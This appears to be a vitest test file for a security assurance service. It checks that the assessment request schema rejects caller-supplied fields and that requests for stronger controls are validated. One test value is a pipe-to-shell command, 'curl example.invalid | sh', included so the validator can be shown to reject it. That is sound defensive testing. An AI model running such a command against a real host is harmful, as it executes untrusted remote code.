import { mkdtemp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Context } from '@deepseek-ai/cordis'
import { afterEach, describe, expect, it } from 'vitest'
import SecurityAssuranceService, {
  startAssessmentRequestSchema,
  type StartAssessmentRequest,
} from '../src/index.ts'
import { referenceHostInvocation } from './support/reference-host.ts'

const temporaryRoots: string[] = []

afterEach(async () => {
  await Promise.all(temporaryRoots.splice(0).map(path => rm(path, { recursive: true, force: true })))
})

const request: StartAssessmentRequest = {
  schemaVersion: 1,
  idempotencyKey: 'adr-0262-start-v1',
  repositoryId: 'repo-00000000-0000-0000-0000-000000000262',
  subject: { kind: 'workspace_snapshot' },
  assessmentMode: 'REPOSITORY',
  assessmentProfileId: 'security/standard',
  target: { kind: 'repository' },
  requestedStrongerControlIds: [],
}

describe('ADR 0262 Start Assessment request boundary', () => {
  it.each([
    ['root', '/caller/chosen/root'],
    ['policyDocument', { allow: '*' }],
    ['providerComposition', [{ providerId: 'caller/provider' }]],
    ['analyzerIds', ['caller/analyzer']],
    ['evidenceKey', 'caller-key-material'],
    ['egressDestinationId', 'delivery/caller-chosen'],
    ['command', 'curl example.invalid | sh'],
    ['budgetIncrease', { milliseconds: 60_000 }],
    ['state', 'SEALED'],
  ])('rejects caller-owned %s semantics', (field, value) => {
    expect(startAssessmentRequestSchema.safeParse({
      ...request,
      [field]: value,
    }).success).toBe(false)
  })

  it('admits only known dependency-complete stronger-control references', async () => {
    const dshHome = await mkdtemp(join(tmpdir(), 'dsh-adr-0262-home-'))
    temporaryRoots.push(dshHome)
    const ctx = new Context()
    const fiber = await ctx.plugin(SecurityAssuranceService, { dshHome })

    try {
      const invocation = referenceHostInvocation(ctx.securityAssurance)
      await expect(ctx.securityAssurance.startAssessment(invocation, request))
        .resolves.toMatchObject({ ok: false, error: { code: 'NOT_FOUND' } })
      await expect(ctx.securityAssurance.startAssessment(invocation, {
        ...request,
        idempotencyKey: 'adr-0262-unknown-control-v1',
        requestedStrongerControlIds: ['caller/arbitrary-control'],
      })).resolves.toMatchObject({ ok: false, error: { code: 'INVALID_REQUEST' } })
      await expect(ctx.securityAssurance.startAssessment(invocation, {
        ...request,
        idempotencyKey: 'adr-0262-missing-dependency-v1',
        requestedStrongerControlIds: ['security/critical-break-glass-v1'],
      })).resolves.toMatchObject({ ok: false, error: { code: 'INVALID_REQUEST' } })
      await expect(ctx.securityAssurance.startAssessment(invocation, {
        ...request,
        idempotencyKey: 'adr-0262-complete-controls-v1',
        requestedStrongerControlIds: [
          'security/risk-decision-window-v1',
          'security/critical-break-glass-v1',
        ],
      })).resolves.toMatchObject({ ok: false, error: { code: 'NOT_FOUND' } })
    } finally {
      await fiber.dispose()
    }
  })
})
